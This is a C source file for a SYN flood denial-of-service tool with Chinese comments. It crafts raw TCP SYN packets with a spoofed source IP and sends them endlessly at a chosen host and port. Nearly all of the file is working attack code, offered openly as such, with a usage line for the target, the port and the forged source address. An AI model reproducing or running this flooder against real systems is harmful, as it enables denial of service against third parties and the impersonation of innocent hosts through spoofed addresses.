#include <signal.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <netdb.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <netinet/in.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <netinet/ip_icmp.h> 
#include <ctype.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <string.h> 
#include <errno.h> 
unsigned long srcport; 
struct pseudohdr 
{ 
struct in_addr saddr; 
struct in_addr daddr; 
u_char zero; 
u_char protocol; 
u_short length; 
struct tcphdr tcpheader; 
}; 
u_short checksum(u_short * data,u_short length) 
{ 
int nleft = length; 
int sum=0; 
unsigned short *w = data; 
unsigned short value = 0; 
while (nleft > 1) { 
sum += *w++; 
nleft -= 2; 
} 
if (nleft == 1) { 
*(unsigned char *) (&value) = *(unsigned char *) w; 
sum += value; 
} 
sum = (sum >>16) + (sum & 0xffff); 
sum += (sum >> 16); 
value = ~sum; 
return(value); 
} 

int main(int argc,char * * argv) 
{
struct sockaddr_in sin; 
struct sockaddr_in din; 
struct hostent * hoste; 
struct hostent * host1; 
int j,sock,foo, flooddot=1; 
char buffer[40]; 
struct ip * ipheader=(struct ip *) buffer; 
struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct ip)); 
struct pseudohdr pseudoheader; 
fprintf(stderr,"Syn attack against one port.(Infinite)/n"); 
if(argc<4) 
{ 
fprintf(stderr,"usage: %s <dstIP> <dstport> <spoofed-srcIP>/n",argv[0]); 
return(-1); 
} 
fprintf(stderr,"%s:%s is being syn'd attacked by %s./n",argv[1],argv[2],argv[3]); 
bzero(&sin,sizeof(struct sockaddr_in)); /*write sizeof to &sin*/ 
sin.sin_family=AF_INET;

if((host1=gethostbyname(argv[3]))!=NULL) 
bcopy(host1->h_addr,&din.sin_addr,host1->h_length); 
else if((din.sin_addr.s_addr=inet_addr(argv[3]))==-1) 
{ 
fprintf(stderr,"unknown source host %s/n",argv[3]); 
return(-1); 
}


if((hoste=gethostbyname(argv[1]))!=NULL) 
bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length); 
else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1) 
{ 
fprintf(stderr,"unknown destination host %s/n",argv[1]); 
return(-1); 
} 
if((sin.sin_port=htons(atoi(argv[2])))==0) 
{ 
fprintf(stderr,"unknown port %s/n",argv[2]); 
return(-1); 
}


if((sock=socket(AF_INET,SOCK_RAW,255))==-1) 
{ 
fprintf(stderr,"couldn't allocate raw socket/n"); 
return(-1); 
} 
foo=1; 
if(setsockopt(sock,0,IP_HDRINCL,(char *)&foo,sizeof(int))==-1) 
{ 
fprintf(stderr,"couldn't set raw header on socket/n"); 
return(-1); 
} 

for(j=1;j>0;j++) 
{ 

bzero(&buffer,sizeof(struct ip)+sizeof(struct tcphdr)); 
ipheader->ip_v=4; 
ipheader->ip_tos=0; 
ipheader->ip_hl=sizeof(struct ip)/4; 
ipheader->ip_len=sizeof(struct ip)+sizeof(struct tcphdr); 
ipheader->ip_id=htons(random()); 
ipheader->ip_ttl=30; /*255;*/ 
ipheader->ip_p=IPPROTO_TCP; 
ipheader->ip_sum=0; 
ipheader->ip_src=din.sin_addr; 
ipheader->ip_dst=sin.sin_addr; 

tcpheader->source=htons(srcport); 
//源端口号 
tcpheader->dest=sin.sin_port; 
//目的端口号 
tcpheader->seq=htonl(0x28374839); 
//SYN序列号 
tcpheader->ack=0; 
//ACK序列号置为0 
tcpheader->syn=1; 
//SYN 标志 
tcpheader->doff=sizeof(struct tcphdr)/4; 
tcpheader->window=htons(2048); 
//窗口大小 
tcpheader->check=0; 

bzero(&pseudoheader,12+sizeof(struct tcphdr)); 
pseudoheader.saddr.s_addr=din.sin_addr.s_addr; 
/*clapnet:源地址*/ 
pseudoheader.daddr.s_addr=sin.sin_addr.s_addr; 
/*clapnet:目的地址*/ 
pseudoheader.protocol=6; 
/*clapnet:协议类型*/ 
pseudoheader.length=htons(sizeof(struct tcphdr)); 
/*clapnet:TCP首部长度*/ 
bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr)); 
tcpheader->check=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr)); 
/*jjgirl:上面是重构报头！*/ 

srcport= (10000.0*random()/(15000+1.0)); 
 
if(sendto(sock,buffer,sizeof(struct ip)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
{ 
fprintf(stderr,"couldn't send packet,%d/n",errno); 
return(-1); 
} 
usleep(2); 
if (!(flooddot = (flooddot+1)%(1))) 
{fprintf(stdout,".");fflush(stdout);} 
} /*The end of the infinite loop*/ 
close(sock); 
return(0); 
} 
